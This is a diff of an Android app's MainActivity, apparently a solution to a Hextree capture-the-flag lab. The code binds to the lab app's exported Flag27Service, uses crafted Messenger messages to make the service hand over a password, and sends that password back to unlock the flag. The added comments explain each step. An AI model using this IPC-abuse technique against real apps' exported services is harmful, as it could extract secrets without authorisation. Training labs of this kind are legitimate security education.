@@ -47,29 +47,6 @@ import androidx.core.view.WindowInsetsCompat;
 
 public class MainActivity extends AppCompatActivity {
 
-
-/*
-
-private class IncomingHandler extends Handler {
-
-IncomingHandler() { super(Looper.getMainLooper());}
-
-
-@Override
-
-public void handleMessage(Message msg){
-
-Log.i("Msg", "Received a message");
-
-}
-
-}
-
-
-private final Messenger clientMessenger = new Messenger(new IncomingHandler());
-
-*/
-
     private final ServiceConnection serviceConnection = new ServiceConnection() {
 
         @Override
@@ -82,17 +59,21 @@ private final Messenger clientMessenger = new Messenger(new IncomingHandler());
             b1.putString("echo", "give flag");
             msg1.setData(b1);
 
+            // first message will set the this.echo() variable in the app to be give flag to be used later.
             try { serviceMessenger.send(msg1); }
             catch (RemoteException e) { e.printStackTrace(); }
 
             Message msg2 = Message.obtain(null, 2);
 
+            // this line is crucial to set the msg2.obj to not be null, as it has to be != null to pass the conditional
             msg2.obj = new Message();
 
+            // replyTo to receive the password the app is supposed to send when msg.what = 2
             msg2.replyTo = new Messenger(new Handler(Looper.getMainLooper()) {
                 @Override
                 public void handleMessage(Message reply) {
 
+                    // get the data from the app reply expected
                     String password = reply.getData().getString("password");
                     Log.i(null, "Password received: " + password);
 
@@ -101,11 +82,13 @@ private final Messenger clientMessenger = new Messenger(new IncomingHandler());
                     }
                     Message msg3 = Message.obtain(null, 3);
                     Bundle b3 = new Bundle();
+                    // put the password received in the password block of the bundle
                     b3.putString("password", password);
                     msg3.setData(b3);
 
                     msg3.replyTo = new Messenger(new Handler(Looper.getMainLooper()));
 
+                    // sends data to the app to capture the flag and start the flag27 activity
                     try { serviceMessenger.send(msg3); }
                     catch (RemoteException e) { e.printStackTrace(); }
                 }
@@ -123,10 +106,6 @@ private final Messenger clientMessenger = new Messenger(new IncomingHandler());
         }
 
     };
-
-
-
-// int counter =0;
 
 
     @Override
@@ -152,7 +131,7 @@ private final Messenger clientMessenger = new Messenger(new IncomingHandler());
 
         TextView hometext = findViewById(R.id.home_text);
 
-        hometext.setText("Welcome from LSEC!");
+        hometext.setText("Hello world!");
 
 
         Button homeButton = findViewById(R.id.home_button);
@@ -170,41 +149,6 @@ private final Messenger clientMessenger = new Messenger(new IncomingHandler());
                         "io.hextree.attacksurface.services.Flag27Service");
 
                 bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
-
-
-/* CODIGO PRA FAZER UM APP STARTAR OUTRO SERVIÇO EXPORTADO
-
-intent.setClassName("io.hextree.attacksurface",
-
-"io.hextree.attacksurface.services.Flag24Service");
-
-
-intent.setAction("io.hextree.services.START_FLAG24_SERVICE");
-
-
-startService(intent);
-
-*/
-
-
-/* BOTAO QUE CONTA ATE 10 PRA COMEÇAR A INTENT DO YOUTUBE!!
-
-Log.i("Hextree", "Welcome from the button");
-
-counter++;
-
-hometext.setText(String.format("Clicked: %d", counter));
-
-
-if(counter==10){
-
-Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://youtube.com"));
-
-startActivity(browserIntent);
-
-}
-
-*/
 
             }
 
